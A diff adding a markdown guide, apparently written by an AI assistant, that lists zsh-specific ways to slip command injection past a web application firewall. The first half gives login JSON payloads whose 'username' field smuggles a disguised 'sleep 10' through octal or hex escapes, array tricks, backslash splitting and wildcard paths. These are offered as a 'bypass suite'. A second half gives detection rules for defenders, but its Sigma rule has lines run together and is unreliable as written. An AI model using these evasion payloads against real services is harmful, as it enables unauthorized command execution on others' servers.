@@ -1,0 +1,77 @@
+## macOS (zsh) Bypass Techniques
+Mac backend environments typically use zsh as the default system shell. While it shares structural features with Linux bash, zsh possesses modern, specialized array expansion operators and unique parameter modification features that allow for completely distinct firewall bypass methods.
+## 1. Hexadecimal and Alternative Byte Injection
+If alphabetic strings are blocked by the firewall, you can trigger native zsh built-in byte parsers. Unlike bash, zsh handles octal and hexadecimal escapes natively inside standard variable expansions without calling external utilities like printf or xxd.
+
+* Native zsh Octal Expansion: Translates numeric bytes directly into execution objects.
+
+{"password":"9012","username":"652223518;$'\163\154\145\145\160' 10;","rememberMe":false}
+
+* Native zsh Hexadecimal Expansion: Avoids character filters using standard hex escaping.
+
+{"password":"9012","username":"652223518;$'\x73\x6c\x65\x65\x70' 10;","rememberMe":false}
+
+
+## 2. Advanced Environment Parameter Arithmetic & Array Slicing
+The zsh engine indexes arrays starting at 1 (unlike Bash, which starts at 0). It also features flag structures like (j::) that pull strings together out of fragmented environment states.
+
+* Zsh Global Parameter Extraction: Extracts characters out of ambient macOS settings to spell protected keywords.
+
+{"password":"9012","username":"652223518;${HOME[1]}l${HOME[1]}ep 10;","rememberMe":false}
+
+* Array Joining Flag Matrix: Joins distinct variables together without using space blocks or standard string operators.
+
+{"password":"9012","username":"652223518;a=(sl ee p);${(j::)a} 10;","rememberMe":false}
+
+
+## 3. WAF Keyword & Escape Character Insertion
+The backslash character (\) can split words up inside a zsh environment to completely disrupt pattern matching.
+
+* Backslash Word Splitting: Breaks static signatures scanning incoming inputs for execution binaries.
+
+{"password":"9012","username":"652223518;s\l\e\e\p 10;","rememberMe":false}
+
+
+## 4. Anonymous Wildcard Globbing
+The macOS file system structure houses its internal BSD core utilities inside /bin/ or /usr/bin/. You can address these paths via regular expression masks.
+
+* Implicit Directory Path Resolution: Maps out execution files without matching clear text rules.
+
+{"password":"9012","username":"652223518;/???[n]/s???[p] 10;","rememberMe":false}
+
+
+------------------------------
+## Detection and Log Monitoring Rules (SIEM / EDR)
+If you are defending systems against these obfuscated payloads, rely on behavior tracking rather than static text signatures. Security tools can catch these exact anomalies using the specific rules below:
+## 1. Checking for Inverted/Reversed Binaries (Sigma Rule Logic)
+
+title: Obfuscated Command Execution via String Reversalstatus: experimentaldescription: Detects command lines attempting to reverse text strings right before launching shell processors (e.g., via rev or PowerShell array indexes).logsource:
+    category: process_creation
+    product: linuxdetection:
+    selection_linux:
+        CommandLine|contains:
+            - 'rev'
+            - '| sh'
+            - '| bash'
+            - '| zsh'
+    selection_windows:
+        CommandLine|contains:
+            - '[-1..-'
+            - '-join'
+    condition: selection_linux or selection_windowsfalsepositives:
+    - Administrative maintenance scripts using native text manipulation utilities.level: high
+
+## 2. Tracking Shell Caret/Backslash Injections (Windows & Linux/macOS)
+
+* Windows CMD Rule: Look for high densities of the caret character. Flag any command line input where the ratio of carets to regular letters exceeds a specific baseline (e.g., ^p^i^n^g).
+* Linux/macOS Rule: Monitor for process arguments containing unexpected combinations of backslashes or quotation marks inside standard path environments (e.g., s\l\e\e\p).
+
+## 3. Parent-Child Process Monitoring (The Ultimate Safety Net)
+Regardless of how heavily an attacker obfuscates their initial text input inside your authentication payload, the final system execution cannot be hidden.
+
+* The Rule: Monitor the backend application process (e.g., node, python, w3wp.exe, php-fpm).
+* The Alert: Trigger an immediate critical alert if your web server process directly spawns a system shell binary such as /bin/sh, /bin/zsh, cmd.exe, or powershell.exe. Web applications should never spin up command shells to process a basic user login.
+
+------------------------------
+Now that you have the complete cross-platform bypass suite and the rules to detect them, would you like to review remediation steps to patch this vulnerability permanently in the backend application code?
+
